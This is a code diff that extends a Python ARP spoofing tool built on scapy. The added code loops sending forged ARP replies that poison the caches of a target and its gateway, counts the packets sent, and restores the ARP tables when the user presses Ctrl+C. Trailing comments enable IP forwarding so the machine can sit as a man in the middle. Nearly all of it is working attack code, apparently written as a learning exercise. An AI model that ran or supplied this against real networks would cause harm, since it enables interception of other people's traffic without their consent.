@@ -11,18 +11,32 @@ def get_mac(ip):
 
     return answered_list[0][1].hwsrc
    
-
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
     
-    scapy.send(packet)
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet= scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4,verbose=False)
+    
 
-while True:
-    spoof("192.168.x.x", "192.168.x.1")
-    spoof("192.168.x.1", "192.168.x.x")
-    time.sleep(2)
 
+sent_packets_count = 0
+try:
+    while True:
+        spoof("192.168.x.x", "192.168.0.x")
+        spoof("192.168.0.x", "192.168.x.x")
+        
+        sent_packets_count = sent_packets_count + 2
+        print("\r[+] Packets sent: " + str(sent_packets_count), end ="")
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("[+] Detectado CTRL + C .... Por favor espera, limpiandotablas ARP... Cerrado ARP Spoofer")
+    restore("192.168.x.x", "192.168.0.x")
+    
 #Terminal 
 #sudo kali
 #echo 1 > /proc/sys/net/ipv4/ip_forward
